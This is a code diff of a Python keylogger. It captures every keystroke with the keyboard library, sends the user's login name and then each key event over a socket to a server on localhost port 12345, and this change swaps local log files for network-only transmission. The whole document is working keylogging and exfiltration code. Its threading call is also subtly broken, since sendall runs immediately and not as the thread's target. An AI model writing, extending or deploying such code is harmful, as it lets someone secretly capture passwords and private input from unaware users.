@@ -10,9 +10,8 @@ server_address = ('localhost', 12345)
 client_socket.connect(server_address)
 client_socket.sendall(str(getpass.getuser()).encode())
 
-def checkLogsPath(path):
-    if os.path.exists(path) == False:
-        os.mkdir(path)
+evento = threading.Event()
+
 
 def recording():
     return keyboard.read_event(suppress=True)
@@ -47,19 +46,22 @@ def writeToFileHuman(lPath, lName, strh):
         else:
             strh = strh.removeprefix("KeyboardEvent(")
             strh = strh.removesuffix(" down)\n")
-        thread_write_server = threading.Thread(target=(client_socket.sendall(strh.encode('utf-8'))))
-        thread_write_server.start()
-
+        try:
+            thread_write_server = threading.Thread(target=(client_socket.sendall(strh.encode('utf-8'))))
+            thread_write_server.start()
+        except:
+            evento.set()
+        """
         newLog = open(lPath + lName, "a")
         newLog.write(strh)
         newLog.close()
+        """
 
 def main():
     tempLogName = str(datetime.now().strftime("%Y-%m-%d %H.%M.%S")) + "_" + getpass.getuser()
     logsPath = "logs/"
-    checkLogsPath(logsPath)
 
-    while True:
+    while evento.is_set() == False:
         tempLog = recording()
         strh = str(tempLog)
 
